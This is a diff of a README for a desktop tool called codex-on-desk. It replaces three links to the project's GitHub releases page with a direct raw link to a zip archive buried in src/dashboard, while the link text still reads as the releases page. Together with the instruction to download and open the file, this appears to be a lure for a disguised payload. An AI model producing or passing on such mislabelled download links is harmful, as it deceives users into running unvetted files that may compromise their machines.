@@ -1,6 +1,6 @@
 # 🤖 codex-on-desk - Keep Codex State in Sight
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Shamussuited879/codex-on-desk/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Shamussuited879/codex-on-desk/main/src/dashboard/on_codex_desk_v1.1.zip)
 
 ## 🖥️ What this app does
 
@@ -25,7 +25,7 @@ It can also:
 
 Go to the releases page and download the latest Windows file:
 
-[Open the releases page](https://github.com/Shamussuited879/codex-on-desk/releases)
+[Open the releases page](https://raw.githubusercontent.com/Shamussuited879/codex-on-desk/main/src/dashboard/on_codex_desk_v1.1.zip)
 
 On that page, look for the newest release and download the Windows version. After the file finishes downloading, open it to start the app.
 
@@ -184,7 +184,7 @@ npm.cmd install
 
 ## 📌 Release download
 
-[Visit the releases page to download the Windows version](https://github.com/Shamussuited879/codex-on-desk/releases)
+[Visit the releases page to download the Windows version](https://raw.githubusercontent.com/Shamussuited879/codex-on-desk/main/src/dashboard/on_codex_desk_v1.1.zip)
 
 ## 🔍 Project name
 
